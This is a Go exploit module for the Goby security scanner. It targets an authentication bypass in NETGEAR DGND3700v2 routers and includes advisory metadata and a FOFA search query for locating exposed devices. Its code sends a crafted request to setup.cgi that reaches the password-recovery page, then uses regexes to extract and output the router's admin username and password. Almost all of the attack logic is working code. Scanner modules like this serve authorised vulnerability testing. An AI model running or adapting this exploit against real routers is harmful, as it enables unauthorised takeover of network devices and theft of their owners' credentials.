package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "NETGEAR DGND3700v2 setup.cgi Api Authentication Bypass",
    "Description": "<p>The NETGEAR DGND3700v2 is an efficient enterprise router.</p><p>NETGEAR DGND3700v2 has an authentication bypass vulnerability. Attackers can use the vulnerability to read user account passwords and access sensitive information pages.</p>",
    "Impact": "<p>NETGEAR DGND3700v2 has an authentication bypass vulnerability. Attackers can use the vulnerability to read user account passwords and access sensitive information pages.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.netgear.com/\">https://www.netgear.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "NETGEAR DGND3700v2",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "NETGEAR DGND3700v2 路由器 setup.cgi 接口身份认证绕过漏洞",
            "Product": "NETGEAR DGND3700v2",
            "Description": "<p>NETGEAR DGND3700v2 是一款高效的企业路由器。</p><p>NETGEAR DGND3700v2 存在身份认证绕过漏洞，攻击者可利用漏洞读取用户账号密码，访问敏感信息页面。</p>",
            "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"https://www.netgear.com/\">https://www.netgear.com/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>NETGEAR DGND3700v2 存在身份认证绕过漏洞，攻击者可利用漏洞读取用户账号密码，访问敏感信息页面。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "NETGEAR DGND3700v2 setup.cgi Api Authentication Bypass",
            "Product": "NETGEAR DGND3700v2",
            "Description": "<p>The NETGEAR DGND3700v2 is an efficient enterprise router.</p><p>NETGEAR DGND3700v2 has an authentication bypass vulnerability. Attackers can use the vulnerability to read user account passwords and access sensitive information pages.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.netgear.com/\">https://www.netgear.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">NETGEAR DGND3700v2 has an authentication bypass vulnerability. Attackers can use the vulnerability to read user account passwords and access sensitive information pages.</span><br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "title=\"DGND3700v2\"",
    "GobyQuery": "title=\"DGND3700v2\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.netgear.com/",
    "DisclosureDate": "2022-02-21",
    "References": [
        "https://ssd-disclosure.com/ssd-advisory-netgear-dgnd3700v2-preauth-root-access/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10261"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "Router Admin Username</span>") && strings.Contains(resp1.RawBody, "Router Admin Password")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && regexp.MustCompile("Router Admin Username<\\/span>:&nbsp;(.*?)<\\/td>").MatchString(resp.RawBody) {
					NameFind := regexp.MustCompile("Router Admin Username<\\/span>:&nbsp;(.*?)<\\/td>").FindStringSubmatch(resp.RawBody)
					PassFind := regexp.MustCompile("Router Admin Password<\\/span>:&nbsp;(.*?)<\\/td>").FindStringSubmatch(resp.RawBody)
					expResult.Output = "user: " + NameFind[1] + "\n" + "password: " + PassFind[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
